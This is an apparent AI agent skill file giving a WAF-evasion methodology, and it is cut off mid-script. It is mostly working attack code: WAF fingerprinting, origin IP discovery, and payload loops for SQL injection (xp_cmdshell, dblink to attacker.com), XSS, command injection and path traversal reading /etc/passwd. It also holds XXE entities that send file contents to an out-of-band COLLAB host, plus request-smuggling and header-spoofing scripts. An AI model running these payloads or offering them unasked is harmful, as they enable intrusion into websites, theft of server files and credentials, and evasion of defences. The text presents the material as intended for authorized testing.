---
description: WAF bypass methodology for authorized offensive security engagements. Covers detection/fingerprinting of Cloudflare/AWS WAF/Akamai/ModSecurity/Imperva, SQLi bypass (MySQL/MSSQL/PostgreSQL/Oracle/SQLite), XSS bypass (30+ payloads), command injection bypass, path traversal bypass, XXE bypass, HTTP-level bypass (chunked/headers/method override/IP spoofing), rate limit bypass, Unicode/encoding bypass, origin IP discovery (10 methods), sqlmap tamper scripts, ffuf WAF bypass flags, custom tamper script writing, and a full ASCII bypass decision tree. Load when WAF is blocking attacks on a target.
---

# WAF BYPASS SKILL

Complete WAF evasion methodology for authorized offensive security engagements.

## PHASE 1 — WAF DETECTION AND FINGERPRINTING

```bash
TARGET_URL="https://target.com"

# Send obvious attack payload — check response for WAF block page
curl -s "${TARGET_URL}/?id=1' OR 1=1--" | grep -iE "cloudflare|sucuri|incapsula|akamai|barracuda|f5|fortiweb|modsecurity|access denied|blocked|forbidden|security" | tee waf_detect.txt
curl -s "${TARGET_URL}/?id=1' OR 1=1--" -I | grep -iE "cf-ray|server|x-powered-by|x-sucuri|x-fw|x-iinfo|x-cache" | tee -a waf_detect.txt

# HTTP status on attack — 403/406/429/503 = WAF
HTTP_CODE=$(curl -so /dev/null -w "%{http_code}" "${TARGET_URL}/?id=1' OR 1=1--")
echo "HTTP code on SQLi probe: $HTTP_CODE" | tee -a waf_detect.txt

# wafw00f — automatic WAF fingerprinting
wafw00f $TARGET_URL -a 2>/dev/null | tee waf_fingerprint.txt

# Identify WAF from response headers
curl -sI $TARGET_URL | tee waf_headers.txt
grep -i "cf-ray\|__cfduid\|__cf_bm" waf_headers.txt && echo "[+] CLOUDFLARE DETECTED"
grep -i "x-iinfo\|incap_ses\|visid_incap" waf_headers.txt && echo "[+] INCAPSULA/IMPERVA DETECTED"
grep -i "ak-bmsc\|akamai" waf_headers.txt && echo "[+] AKAMAI DETECTED"
grep -i "x-amzn-requestid\|x-amz-cf-id" waf_headers.txt && echo "[+] AWS CLOUDFRONT/WAF DETECTED"
grep -i "server: barracuda" waf_headers.txt && echo "[+] BARRACUDA DETECTED"
grep -i "x-sucuri-id\|sucuri" waf_headers.txt && echo "[+] SUCURI DETECTED"
grep -i "server: f5\|x-waf-status" waf_headers.txt && echo "[+] F5 ASM DETECTED"
grep -i "x-fw-debug\|server: fortiweb" waf_headers.txt && echo "[+] FORTIWEB DETECTED"

# Cloudflare-specific detection
curl -sI "https://$TARGET_HOST/cdn-cgi/trace" 2>/dev/null | head -20 | tee cloudflare_trace.txt
```

### WAF Vendor Cheat Sheet

```
CLOUDFLARE:
  Headers: CF-RAY, CF-Cache-Status, __cfduid, __cf_bm, cf-request-id
  Block page: "Attention Required! | Cloudflare"
  Response: HTTP 403 or 1020
  Error page: Ray ID at bottom

AWS WAF:
  Headers: x-amzn-RequestId, X-Amz-Cf-Id (CloudFront)
  Block page: HTTP 403, {"message":"Forbidden"}
  Can combine with CloudFront

AKAMAI:
  Headers: X-Check-Cacheable, AK-BMsc, Akamai-Origin-Hop
  Block page: "Access Denied — Akamai Reference"
  Rate limit: 429 with X-RateLimit headers

IMPERVA/INCAPSULA:
  Cookies: incap_ses_*, visid_incap_*
  Headers: X-Iinfo, X-CDN
  Block page: "Request unsuccessful. Incapsula incident ID"

MODSECURITY (CRS):
  Headers: Server: Apache (no WAF header)
  Block page: "Not Acceptable!" HTTP 406 / 403
  Audit log: /var/log/apache2/modsec_audit.log

SUCURI:
  Headers: X-Sucuri-ID, X-Sucuri-Cache
  Block page: "Website Firewall — Access Denied"

F5 BIG-IP ASM:
  Cookies: TS01* (F5 cookie)
  Block page: "The requested URL was rejected"
  Headers: X-WAF-Status, Server: BigIP
```

## PHASE 2 — ORIGIN IP DISCOVERY (10 METHODS)

```bash
TARGET_DOMAIN="target.com"
WORKSPACE=~/recon_target

# Method 1: Historical DNS records (SecurityTrails / PassiveDNS)
curl -s "https://api.securitytrails.com/v1/history/${TARGET_DOMAIN}/dns/a" \
  -H "APIKEY: YOUR_KEY" | jq -r '.records[].values[].ip' | sort -u > origin_securitytrails.txt
curl -s "https://api.securitytrails.com/v1/domain/${TARGET_DOMAIN}" \
  -H "APIKEY: YOUR_KEY" | jq -r '.current_dns.a.values[].ip' >> origin_securitytrails.txt

# Method 2: Certificate transparency — find IPs from cert SAN/CN
curl -s "https://crt.sh/?q=%25.$TARGET_DOMAIN&output=json" | jq -r '.[].name_value' | \
  while read host; do
    ip=$(dig +short $host A 2>/dev/null | head -1)
    [ -n "$ip" ] && echo "$host -> $ip"
  done | tee origin_cert_ips.txt

# Method 3: Shodan — search by SSL cert for this domain
shodan search "ssl.cert.subject.cn:$TARGET_DOMAIN" --fields ip_str,port 2>/dev/null | tee origin_shodan.txt
shodan search "http.title:\"$TARGET_DOMAIN\"" --fields ip_str,port 2>/dev/null >> origin_shodan.txt
# Shodan SSL fingerprint
shodan search "ssl:$TARGET_DOMAIN -has_vuln:false" --fields ip_str 2>/dev/null >> origin_shodan.txt

# Method 4: Censys — SSL certificate search
curl -s "https://search.censys.io/api/v2/hosts/search" \
  -H "Content-Type: application/json" \
  -u "API_ID:API_SECRET" \
  -d "{\"q\":\"parsed.names:$TARGET_DOMAIN\",\"fields\":[\"ip\",\"443.https.tls.certificate.parsed.names\"]}" \
  | jq -r '.result.hits[].ip' | tee origin_censys.txt

# Method 5: Favicon hash — find origin via Shodan favicon search
# Calculate favicon murmur hash first
curl -s "https://$TARGET_DOMAIN/favicon.ico" -o /tmp/fav.ico 2>/dev/null
python3 -c "
import mmh3, base64
data = open('/tmp/fav.ico','rb').read()
b64 = base64.encodebytes(data)
h = mmh3.hash(b64)
print(f'http.favicon.hash:{h}')
" 2>/dev/null | tee origin_favicon_hash.txt
# Search on Shodan: shodan search "http.favicon.hash:HASH" --fields ip_str

# Method 6: SPF record — reveals mail server IPs (often same subnet)
dig $TARGET_DOMAIN TXT | grep "spf\|include\|ip4\|ip6" | tee origin_spf.txt
# Extract IPs from SPF
dig $TARGET_DOMAIN TXT | grep -oP "ip4:\K[0-9./]+" | tee origin_spf_ips.txt

# Method 7: Email headers — find originating mail server IP
# Check MX record, send email, inspect headers
MX=$(dig $TARGET_DOMAIN MX +short | sort -n | head -1 | awk '{print $2}')
dig +short $MX A | tee origin_mx.txt

# Method 8: Subdomains that bypass CDN — direct IP exposure
for sub in mail smtp ftp cpanel direct origin backend api-internal dev staging test; do
  IP=$(dig +short $sub.$TARGET_DOMAIN A 2>/dev/null | head -1)
  if [ -n "$IP" ]; then
    # Check if this IP is a CDN IP
    echo "$IP $sub.$TARGET_DOMAIN" | tee -a origin_subdomains.txt
  fi
done

# Method 9: Error page fingerprinting — origin may expose itself in errors
# Request non-existent resource, compare error page to direct IP access
curl -s "${TARGET_URL}/DOESNOTEXIST_$(date +%s)" > /tmp/cdn_error.txt
# Try direct IP access
TARGET_IP=$(dig +short $TARGET_DOMAIN | head -1)
curl -s -H "Host: $TARGET_DOMAIN" "https://$TARGET_IP/DOESNOTEXIST_$(date +%s)" 2>/dev/null > /tmp/origin_error.txt
diff /tmp/cdn_error.txt /tmp/origin_error.txt > /tmp/error_diff.txt && echo "Errors differ — IP may not be origin"

# Method 10: Web archive — old DNS records before CDN
curl -s "http://web.archive.org/cdx/search/cdx?url=$TARGET_DOMAIN&output=json&fl=timestamp,original,statuscode&limit=50" \
  | python3 -c "
import json,sys
for r in json.load(sys.stdin)[1:]:
    print(r)
" 2>/dev/null | tee origin_wayback.txt

# Subdomain finder for origin IPs
for sub in $(cat $WORKSPACE/recon/subdomains/all_subdomains.txt); do
  IP=$(dig +short $sub A 2>/dev/null | head -1)
  [ -n "$IP" ] && echo "$IP $sub" >> origin_all_subs.txt
done
# Filter out known CDN IP ranges (Cloudflare: 103.21.244.0/22, 103.22.200.0/22, etc.)
python3 -c "
import ipaddress
cloudflare = [
    '103.21.244.0/22','103.22.200.0/22','103.31.4.0/22','104.16.0.0/13',
    '104.24.0.0/14','108.162.192.0/18','131.0.72.0/22','141.101.64.0/18',
    '162.158.0.0/15','172.64.0.0/13','173.245.48.0/20','188.114.96.0/20',
    '190.93.240.0/20','197.234.240.0/22','198.41.128.0/17'
]
cf_nets = [ipaddress.ip_network(n) for n in cloudflare]
with open('origin_all_subs.txt') as f:
    for line in f:
        try:
            ip, host = line.strip().split(' ',1)
            addr = ipaddress.ip_address(ip)
            if not any(addr in net for net in cf_nets):
                print(f'NON-CDN: {ip} {host}')
        except: pass
" 2>/dev/null | tee origin_non_cdn.txt

# Verify origin candidate
for ip in $(awk '{print $1}' origin_non_cdn.txt | sort -u); do
  STATUS=$(curl -sk -H "Host: $TARGET_DOMAIN" "https://$ip/" -o /dev/null -w "%{http_code}" 2>/dev/null)
  [ "$STATUS" != "000" ] && echo "[ORIGIN CANDIDATE] $ip -> HTTP $STATUS" | tee -a origin_confirmed.txt
done
```

## PHASE 3 — SQLI WAF BYPASS

### MySQL

```
TECHNIQUE                          PAYLOAD EXAMPLE
----------------------------------------------------------------------
1.  Inline comments                1/**/OR/**/1=1--
2.  Multi-line comments            1/*!OR*/1=1--
3.  Version comment                1/*!50000OR*/1=1--
4.  Case variation                 1 oR 1=1--
5.  Double-keyword (bypass strip)  1 OORR 1=1--
6.  URL encoding                   1%20OR%201%3D1--
7.  HTML entity                    1&#x20;OR&#x20;1=1--
8.  Unicode whitespace             1\u0009OR\u00091=1-- (tab)
9.  Null byte injection            1%00 OR 1=1--
10. Scientific notation            1e0 OR 1e0=1e0--
11. Backtick identifier            SELECT `username` FROM users
12. @ variable                     SELECT @v:=1 FROM users WHERE @v=1
13. Hex encoding                   1 OR 0x313d31--  (0x31='1')
14. CHAR() function                1 OR CHAR(49)=CHAR(49)--
15. Concat                         1 OR CONCAT(0x61,0x64,0x6d,0x69,0x6e)='admin'
16. GROUP_CONCAT bypass            SELECT GROUP_CONCAT(table_name SEPARATOR ',')
17. Subquery spacing               1 OR(SELECT(1))=1--
18. Comparison operators           1 OR 1 LIKE 1
19. Bitwise operators              1 | 0
20. LIMIT bypass                   LIMIT 0,1 -> LIMIT 0e0,1
```

```bash
TARGET_URL="https://target.com/api/products"

# MySQL bypass payloads
MYSQL_BYPASSES=(
  "1/**/OR/**/1=1--+-"
  "1/*!50000OR*/1=1--+-"
  "1%0aOR%0a1=1--+-"
  "1%09OR%091=1--+-"
  "1%0bOR%0b1=1--+-"
  "1%0cOR%0c1=1--+-"
  "1%0dOR%0d1=1--+-"
  "1%a0OR%a01=1--+-"
  "1%23%0aOR%23%0a1=1--+-"
  "1/*!OR*/1=1--+-"
  "1 oR 1=1--+-"
  "1 Or 1=1--+-"
  "1 OORR 1=1--+-"
  "1%00OR 1=1--+-"
)

for payload in "${MYSQL_BYPASSES[@]}"; do
  STATUS=$(curl -so /dev/null -w "%{http_code}" "${TARGET_URL}?id=$payload")
  RESP=$(curl -s "${TARGET_URL}?id=$payload" | wc -c)
  echo "$STATUS ($RESP bytes) <- $payload" | tee -a sqli_mysql_bypass.txt
done

# MySQL UNION bypass
curl -s "${TARGET_URL}?id=1 UNION/**/SELECT/**/1,2,3--+-" | tee sqli_union1.txt
curl -s "${TARGET_URL}?id=1/*!UNION*//*!SELECT*/1,2,3--+-" | tee sqli_union2.txt
curl -s "${TARGET_URL}?id=1%0aUNION%0aSELECT%0a1,2,3--+-" | tee sqli_union3.txt
curl -s "${TARGET_URL}?id=1 UNION%23foo%0aSELECT 1,2,3--+-" | tee sqli_union4.txt

# MySQL information_schema bypass
curl -s "${TARGET_URL}?id=1 UNION SELECT table_name,2,3 FROM/**/information_schema/**/tables--+-" | tee sqli_tables.txt
curl -s "${TARGET_URL}?id=1 UNION SELECT table_name,2,3 FROM(information_schema.tables)--+-" | tee sqli_tables2.txt

# sqlmap with tamper for MySQL WAF
sqlmap -u "${TARGET_URL}?id=1" \
  --tamper=space2comment,charencode,greatest,ifnull2ifisnull,modsecurityversioned \
  --level=5 --risk=3 --batch -p id \
  --dbms=mysql -v 3 | tee sqlmap_mysql_bypass.txt
```

### MSSQL

```
TECHNIQUE                          PAYLOAD EXAMPLE
----------------------------------------------------------------------
1.  Comment injection              1/**/OR/**/1=1--
2.  Case mix                       1 Or 1=1--
3.  URL encode spaces              1%20OR%201=1--
4.  Tab/newline delimit            1[TAB]OR[TAB]1=1--
5.  EXEC xp_cmdshell               EXEC(0x78705f636d647368656c6c...)
6.  Hex string concat              SELECT CHAR(65)+CHAR(68)+CHAR(77)+CHAR(73)+CHAR(78)
7.  Variable assignment            DECLARE @v NVARCHAR(100); SET @v='admin'; SELECT @v
8.  Stacked queries                1; EXEC xp_cmdshell('whoami')--
9.  WAITFOR DELAY (blind)          1; WAITFOR DELAY '0:0:5'--
10. Subquery                       (SELECT TOP 1 name FROM sysobjects WHERE xtype='U')
11. CAST bypass                    1 OR CAST(1 AS INT)=1
12. IIF function                   SELECT IIF(1=1,'a','b')
13. String split bypass            SELECT * FROM users WHERE id='1' OR '1'='1'
14. OPENROWSET SSRF                SELECT * FROM OPENROWSET('SQLNCLI','server=attacker;uid=sa;pwd=x;','SELECT 1')
15. sys.objects                    SELECT name FROM sys.objects WHERE type='U'
```

```bash
# MSSQL tamper scripts
sqlmap -u "${TARGET_URL}?id=1" \
  --tamper=space2mssqlblank,charencode,equaltolike,greatest \
  --level=5 --risk=3 --batch --dbms=mssql | tee sqlmap_mssql_bypass.txt

# MSSQL blind time-based bypass
curl -s "${TARGET_URL}?id=1;WAITFOR%20DELAY%20'0:0:5'--" | tee mssql_timebased.txt

# MSSQL stacked query
curl -s "${TARGET_URL}?id=1;EXEC%20xp_cmdshell('whoami')--" | tee mssql_exec.txt
```

### PostgreSQL

```
TECHNIQUE                          PAYLOAD EXAMPLE
----------------------------------------------------------------------
1.  Dollar quoting                 SELECT $$admin$$
2.  Type cast                      SELECT 1::boolean
3.  Function bypass                SELECT CHR(65)||CHR(68)||CHR(77)||CHR(73)||CHR(78)
4.  Pg_sleep (blind)               1;SELECT pg_sleep(5)--
5.  Copy to/from                   COPY (SELECT passwd FROM pg_shadow) TO '/tmp/out'
6.  PL/pgSQL execute               CREATE OR REPLACE FUNCTION exec(text) RETURNS text AS $$ BEGIN PERFORM pg_sleep(5); END; $$ LANGUAGE plpgsql; SELECT exec('id')
7.  CASE WHEN blind                1 AND (CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
8.  Array functions                SELECT array_to_string(ARRAY(SELECT table_name FROM information_schema.tables),',')
9.  String_agg                     SELECT string_agg(table_name,',') FROM information_schema.tables
10. OID casting                    SELECT relname FROM pg_class WHERE oid=16384
```

```bash
sqlmap -u "${TARGET_URL}?id=1" \
  --tamper=space2comment,charencode,chardoubleencode,between,greatest \
  --level=5 --risk=3 --batch --dbms=postgresql | tee sqlmap_pg_bypass.txt

# PostgreSQL OOB via dblink
curl -s "${TARGET_URL}?id=1;SELECT+dblink_connect('host=attacker.com user=a password=a dbname=a')--"
```

### Oracle

```
TECHNIQUE                          PAYLOAD EXAMPLE
----------------------------------------------------------------------
1.  DUAL table                     SELECT 1 FROM dual
2.  All_tables                     SELECT table_name FROM all_tables
3.  DBMS_PIPE                      DBMS_PIPE.RECEIVE_MESSAGE('a',5) -- time-based
4.  UTL_HTTP SSRF                  SELECT UTL_HTTP.REQUEST('http://attacker/') FROM dual
5.  CTXCAT syntax                  SELECT * FROM ctxsys.ctx_user_indexes
6.  Comment style                  1 --  (double dash works)
7.  Concat via ||                  SELECT 'admin'||'istrator' FROM dual
8.  NVL function                   SELECT NVL(null,'admin') FROM dual
9.  DECODE bypass                  SELECT DECODE(1,1,'yes','no') FROM dual
10. XMLType SSRF                   SELECT XMLType('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker/">%remote;]><r/>') FROM dual
```

### SQLite

```
TECHNIQUE                          PAYLOAD EXAMPLE
----------------------------------------------------------------------
1.  sqlite_master                  SELECT name FROM sqlite_master WHERE type='table'
2.  RANDOMBLOB timing              1 AND 1=(SELECT 1 FROM sqlite_master WHERE randomblob(500000000))
3.  LOAD_EXTENSION                 SELECT LOAD_EXTENSION('/lib/libc.so.6','system')
4.  String concat                  SELECT 'adm'||'in'
5.  Type casting                   SELECT CAST(1 AS TEXT)
6.  HEX encode                     SELECT HEX(name) FROM sqlite_master
7.  SUBSTR                         SELECT SUBSTR(sqlite_version(),1,1)
```

## PHASE 4 — XSS WAF BYPASS

```bash
TARGET_URL="https://target.com/search"
PARAM="q"

# 30+ XSS bypass payloads
XSS_PAYLOADS=(
  # Basic encoding
  "<script>alert(1)</script>"
  "<ScRiPt>alert(1)</ScRiPt>"
  "%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
  "%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E"
  "\x3cscript\x3ealert(1)\x3c/script\x3e"
  "&#60;script&#62;alert(1)&#60;/script&#62;"
  "&lt;script&gt;alert(1)&lt;/script&gt;"
  # Event handlers
  "<img src=x onerror=alert(1)>"
  "<img src=x onerror=alert\`1\`>"
  "<img src=x onerror=\"alert(1)\">"
  "<img src=x onerror='alert(1)'>"
  "<img/src=x/onerror=alert(1)>"
  "<img src=x onerror=alert(document.domain)>"
  # Without event handler keyword
  "<body onload=alert(1)>"
  "<svg onload=alert(1)>"
  "<svg/onload=alert(1)>"
  "<details open ontoggle=alert(1)>"
  "<select autofocus onfocus=alert(1)>"
  "<input autofocus onfocus=alert(1)>"
  "<video src=x onerror=alert(1)>"
  "<audio src=x onerror=alert(1)>"
  # Attribute context
  "\" onerror=\"alert(1)"
  "' onerror='alert(1)"
  "javascript:alert(1)"
  "JaVaScRiPt:alert(1)"
  "java&#x09;script:alert(1)"
  "java\tscript:alert(1)"
  # Tag attribute breakout
  "\"><script>alert(1)</script>"
  "'><script>alert(1)</script>"
  # Template literal
  "<script>alert\`1\`</script>"
  # Null byte
  "<scr\x00ipt>alert(1)</scr\x00ipt>"
  # Nested tags
  "<scr<script>ipt>alert(1)</scr</script>ipt>"
  "<sc<script>ript>alert(1)</sc</script>ript>"
  # Expression injection (Angular/Vue)
  "{{constructor.constructor('alert(1)')()}}"
  "${alert(1)}"
  # Polyglot
  "jaVasCript:/*-/*\`/*\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e"
  # Mutation XSS
  "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">"
  # Script in data URI
  "<iframe src=\"data:text/html,<script>alert(1)</script>\">"
  # Srcdoc
  "<iframe srcdoc=\"<script>alert(1)</script>\">"
  # Object data
  "<object data=\"javascript:alert(1)\">"
  # CSS expression (IE)
  "<div style=\"background-image:url(javascript:alert(1))\">"
  # SVG animate
  "<svg><animate onbegin=alert(1) attributeName=x></svg>"
  "<svg><set onbegin=alert(1) attributeName=x></svg>"
  # meta refresh
  "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">"
  # form action
  "<form action=\"javascript:alert(1)\"><input type=submit></form>"
  # link href
  "<link rel=import href=\"javascript:alert(1)\">"
)

for payload in "${XSS_PAYLOADS[@]}"; do
  ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null)
  STATUS=$(curl -so /dev/null -w "%{http_code}" "${TARGET_URL}?${PARAM}=$ENC")
  RESP=$(curl -s "${TARGET_URL}?${PARAM}=$ENC")
  REFLECTED=$(echo "$RESP" | grep -oP "alert\(1\)|onerror|onload|javascript:" | head -1)
  echo "$STATUS [$REFLECTED] <- ${payload:0:50}" | tee -a xss_bypass.txt
done

# Context-specific XSS — HTML attribute context
curl -s "${TARGET_URL}?${PARAM}=\" onmouseover=alert(1) test=\"" | tee xss_attr.txt
curl -s "${TARGET_URL}?${PARAM}=' onmouseover=alert(1) test='" | tee xss_attr2.txt

# JS context
curl -s "${TARGET_URL}?${PARAM}='-alert(1)-'" | tee xss_js.txt
curl -s "${TARGET_URL}?${PARAM}=\`;alert(1)//'" | tee xss_js2.txt

# CSP-aware XSS via JSONP
# Find JSONP endpoints allowed in CSP
curl -sI $TARGET_URL | grep -i "content-security-policy" | grep -oP "https?://[^;'\"]+" | sort -u | tee csp_sources.txt
# Check if any of those have JSONP
while read src; do
  curl -s "${src}?callback=alert" | grep -q "alert(" && echo "[JSONP] $src" | tee -a xss_jsonp.txt
done < csp_sources.txt
```

## PHASE 5 — COMMAND INJECTION BYPASS

```bash
TARGET_URL="https://target.com/api/ping"

# Basic command injection bypass techniques
CMD_BYPASSES=(
  # Space bypass
  "127.0.0.1;id"
  "127.0.0.1;{id}"
  "127.0.0.1;\${IFS}id"
  "127.0.0.1;\$IFS\$9id"
  "127.0.0.1;\${IFS}id"
  "127.0.0.1%09id"   # tab
  "127.0.0.1%0aid"   # newline
  "127.0.0.1%0did"   # CR
  # Separators
  "127.0.0.1|id"
  "127.0.0.1||id"
  "127.0.0.1&&id"
  "127.0.0.1%26id"
  "127.0.0.1%26%26id"
  "127.0.0.1\`id\`"
  "127.0.0.1\$(id)"
  # Keyword bypass
  "127.0.0.1;i\$@d"
  "127.0.0.1;i''d"
  "127.0.0.1;i\"\"d"
  "127.0.0.1;wh\oami"
  # Wildcard
  "127.0.0.1;/usr/bin/i??"
  "127.0.0.1;/usr/bin/*d"
  # Env var
  "127.0.0.1;\$SHELL -c id"
  "127.0.0.1;{cat,/etc/passwd}"
  "127.0.0.1;{ls,-la,/}"
)

for payload in "${CMD_BYPASSES[@]}"; do
  ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null)
  RESP=$(curl -s "${TARGET_URL}?host=$ENC")
  echo "$RESP" | grep -qiE "uid=|root:|www-data" && echo "[CMD INJECTION] $payload" | tee -a cmdi_bypass.txt
done

# OOB command injection
curl -s "${TARGET_URL}?host=127.0.0.1\$(curl+http://COLLAB/\$(id))" | tee cmdi_oob.txt
curl -s "${TARGET_URL}?host=127.0.0.1;nslookup+\$(whoami).COLLAB" | tee cmdi_dns.txt
```

## PHASE 6 — PATH TRAVERSAL BYPASS

```bash
TARGET_URL="https://target.com/api/download"

# Path traversal bypass payloads
TRAVERSAL_BYPASSES=(
  # Basic
  "../../../../etc/passwd"
  "..//..//..//..//etc/passwd"
  "..%2F..%2F..%2F..%2Fetc%2Fpasswd"
  "..%252F..%252F..%252Fetc%252Fpasswd"   # double URL encode
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
  "%2e%2e/%2e%2e/%2e%2e/etc/passwd"
  "..%c0%af..%c0%af..%c0%afetc/passwd"    # overlong UTF-8
  "..%e0%80%afetc/passwd"
  "....//....//....//etc/passwd"
  "....\/....\/....\/etc/passwd"
  "../../../etc/passwd%00.png"            # null byte
  "../../../etc/passwd%00"
  "../../../etc/passwd%20"
  "..\\..\\..\\windows\\win.ini"          # Windows
  "..%5c..%5c..%5cwindows%5cwin.ini"
  "..\\..\\..\\"
  # Absolute paths
  "/etc/passwd"
  "/./etc/./passwd"
  "/etc//passwd"
  # Filter bypass via accepted extension + traversal
  "safe.txt/../../../etc/passwd"
  "images/../../../etc/passwd"
  # PHP filter stream
  "php://filter/convert.base64-encode/resource=/etc/passwd"
  "php://filter/read=string.rot13/resource=/etc/passwd"
)

for payload in "${TRAVERSAL_BYPASSES[@]}"; do
  ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null)
  RESP=$(curl -s "${TARGET_URL}?file=$ENC")
  echo "$RESP" | grep -q "root:" && echo "[TRAVERSAL] $payload" | tee -a traversal_bypass.txt
done
```

## PHASE 7 — XXE BYPASS

```bash
TARGET_URL="https://target.com/api/import"

# XXE bypass payloads
# 1. UTF-16 encoding
python3 -c "
content = '''<?xml version=\"1.0\" encoding=\"UTF-16\"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>
<root>&xxe;</root>'''
with open('/tmp/xxe_utf16.xml', 'wb') as f:
    f.write(content.encode('utf-16'))
"
curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/xml; charset=UTF-16" \
  --data-binary @/tmp/xxe_utf16.xml | tee xxe_utf16.txt

# 2. Parameter entity in DTD (bypass inline entity blocks)
cat > /tmp/xxe_param.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://COLLAB/?x=%file;'>">
  %eval;
]>
<root>&exfil;</root>
EOF
curl -s -X POST "$TARGET_URL" -H "Content-Type: application/xml" \
  --data-binary @/tmp/xxe_param.xml | tee xxe_param.txt

# 3. CDATA bypass
cat > /tmp/xxe_cdata.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % end "]]>">
  <!ENTITY % combined "<!ENTITY all '%start;%file;%end;'>">
  %combined;
]>
<root>&all;</root>
EOF
curl -s -X POST "$TARGET_URL" -H "Content-Type: application/xml" \
  --data-binary @/tmp/xxe_cdata.xml | tee xxe_cdata.txt

# 4. Blind XXE via error messages
cat > /tmp/xxe_error.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root/>
EOF
curl -s -X POST "$TARGET_URL" -H "Content-Type: application/xml" \
  --data-binary @/tmp/xxe_error.xml | tee xxe_error_based.txt

# 5. JSON to XML conversion bypass — send JSON that becomes XML
curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"xml":"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"}' \
  | tee xxe_json_converted.txt

# 6. XInclude bypass (when DOCTYPE not allowed)
curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/xml" \
  --data '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></foo>' \
  | tee xxe_xinclude.txt
```

## PHASE 8 — HTTP-LEVEL BYPASS

```bash
TARGET_URL="https://target.com"
TARGET_HOST="target.com"

# 1. Chunked Transfer Encoding bypass
python3 << 'PYEOF'
import socket, ssl

HOST = "target.com"
PORT = 443
PAYLOAD = "1' OR '1'='1"

# Send attack in chunked body (some WAFs only inspect full body)
body = f"id={PAYLOAD}"
chunk_size = hex(len(body))[2:]
chunked_body = f"{chunk_size}\r\n{body}\r\n0\r\n\r\n"

request = (
    f"POST /api/login HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"Content-Type: application/x-www-form-urlencoded\r\n"
    f"Transfer-Encoding: chunked\r\n"
    f"Connection: close\r\n"
    f"\r\n"
    f"{chunked_body}"
).encode()

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
with socket.create_connection((HOST, PORT)) as s:
    with ctx.wrap_socket(s, server_hostname=HOST) as ss:
        ss.sendall(request)
        print(ss.recv(4096).decode(errors='replace'))
PYEOF

# 2. Header injection — bypass IP blocklists
for ip_header in "X-Forwarded-For" "X-Real-IP" "X-Originating-IP" "Client-IP" \
  "True-Client-IP" "X-Client-IP" "CF-Connecting-IP" "Forwarded" "X-Cluster-Client-IP" \
  "X-Forwarded" "X-Remote-IP" "X-Remote-Addr" "X-Host" "X-Custom-IP-Authorization"; do
  for spoof_ip in "127.0.0.1" "localhost" "192.168.1.1" "10.0.0.1"; do
    STATUS=$(curl -so /dev/null -w "%{http_code}" "$TARGET_URL/?id=1' OR 1=1--" \
      -H "$ip_header: $spoof_ip")
    [ "$STATUS" != "403" ] && [ "$STATUS" != "406" ] && [ "$STATUS" != "429" ] && \
      echo "[BYPASS] $ip_header: $spoof_ip -> HTTP $STATUS" | tee -a header_ip_bypass.txt
  done
done

# 3. HTTP method override
for method_header in "X-HTTP-Method-Override" "X-HTTP-Method" "X-Method-Override" "_method"; do
  STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "$TARGET_URL/api/admin/delete" \
    -H "$method_header: DELETE" -H "Content-Type: application/json" \
    -d '{"id":1}')
  echo "$method_header: DELETE -> HTTP $STATUS" | tee -a method_override.txt
done

# 4. Protocol downgrade (HTTP/1.0 vs HTTP/1.1 behavior differences)
curl -s --http1.0 "${TARGET_URL}?id=1' OR 1=1--" | tee http10_bypass.txt
curl -s --http2 "${TARGET_URL}?id=1' OR 1=1--" 2>/dev/null | tee http2_bypass.txt

# 5. Content-Type manipulation bypass
for ct in \
  "application/json" \
  "application/x-www-form-urlencoded" \
  "text/plain" \
  "application/xml" \
  "multipart/form-data; boundary=----test" \
  "application/octet-stream" \
  "text/html" \
  "application/javascript" \
  "application/x-json" \
  "application/x-javascript"; do
  STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "$TARGET_URL/api/search" \
    -H "Content-Type: $ct" \
    --data "query=1' OR 1=1--")
  echo "$ct -> HTTP $STATUS" | tee -a content_type_bypass.txt
done

# 6. HTTP/2 header injection bypass
# HTTP/2 WAFs may not handle pseudo-header manipulation
curl -s --http2 "$TARGET_URL/?id=1'%20OR%201=1--" 2>/dev/null | tee http2_sqli.txt

# 7. Large header value bypass (some WAFs skip inspection on very long values)
LONG_PADDING=$(python3 -c "print('A'*8192)")
curl -s "$TARGET_URL/?id=1" \
  -H "X-Padding: $LONG_PADDING" \
  -H "X-Payload: 1' OR 1=1--" | tee large_header_bypass.txt

# 8. Pipeline bypass
python3 << 'PYEOF'
